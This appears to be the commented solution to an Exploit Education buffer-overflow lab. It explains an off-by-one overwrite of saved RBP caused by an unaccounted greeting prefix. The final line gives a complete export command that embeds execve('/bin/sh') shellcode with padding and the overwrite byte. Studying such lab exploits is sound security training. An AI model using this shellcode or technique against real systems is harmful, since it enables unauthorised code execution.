# Buffer overflow - string length check bug vulnerability

# This exercise explores a security measure where it must truncate the length of the
# buffer at 127 bytes from a sizeof(buffer). It does not take into account another
# string copy before it, and thus overrides a portion of a register pop location.

# First, it copies a symbol preprocessor macro GREET, and it's "Welcome, I am pleased to meet you "
# for amd64. That's 34 bytes worth of space taken.

# Then, it copies our contents of env var ExploitEducation into our buffer. However, since it's copying up to 127 chars, it will
# override 1 byte from the RBP address. When it gets put into RSP, then we have control of the leave address when main() starts
# its return.

# When ExploitEducation is set to 127*'A', it receives a segmentation fault when ran.

# When export ExploitEducation=$(python -c 'print("A"*126 + "\x10")'), we have our ending main RSP=0x7fffffffe018
# Which is 8 bytes higher than our 0x10 override from RBP. If we wish to return into another address, we can 
# change our last char to a value that leaves it to 0x7fffffffe008 - 0x7fffffffe107 exclusive.

# While examining the stack at our main RBP address for somewhere we can control, I noticed ExploitEducation pointer
# (RBP-0x8 or 0x7fffffffe018) leading into our buffer overflow start. This is where we can begin shell execution. So,
# our char needs to be 0x10. The last important note is that we need to make sure the environment from our OS is the same.


# I did not include the export command in the script, but it's this (using shellcraft.sh()) - mind the arch, OS, and environment:
# export ExploitEducation=$(python -c "print('jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05' + 'A'*78 + '\x10')")
